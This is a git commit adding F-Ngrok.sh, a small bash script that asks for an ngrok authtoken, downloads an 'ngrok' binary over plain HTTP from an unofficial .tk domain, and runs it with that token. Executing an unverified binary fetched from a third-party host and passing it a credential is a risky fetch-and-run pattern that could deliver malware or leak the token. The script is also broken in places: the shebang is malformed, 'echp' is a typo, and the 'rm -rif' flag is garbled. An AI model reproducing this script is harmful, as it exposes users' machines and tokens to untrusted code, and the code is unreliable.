45053e8029f275c279812760d5de3c5e187c2478
Plus-X4 <47147208+PlusX4@users.noreply.github.com>
2019-03-31 12:48:54 +0300

    Create F-Ngrok.sh

---
+++ F-Ngrok.sh
@@ -0,0 +1,24 @@
+#!bin/bash
+#PlusX4
+clear
+sleep 3
+echp -e '''
+\e[1;31m      ______ _        _   _                 _
+      |  ___(_)      | \ | |               | |
+      | |_   ___   |  \| |  _ _  ___ | | 
+      |  _| | \ \/ / | .  |/ _ | `/ _ \| |/ /
+      | |   | |>  <  | |\  | (_| | | | (_) |   <
+      \_|   |_/_/\_\ \_| \_/\, |_|  \___/|_|\_\
+                             __/ |
+                            |___/
+         \e[1;37m       The Script By:PlusX4  
+           
+\e[1;32m '''
+read -p "[?] Enter Authtoken >> " A
+cd $HOME
+rm -rif ngrok
+wget http://nullbytestream.tk/files/ngrok
+./ngrok authtoken $A
+echo -e '      \e[1;33m   '
+read -p '   Done ( : ' 
+rm -rif Fix-Ngrok
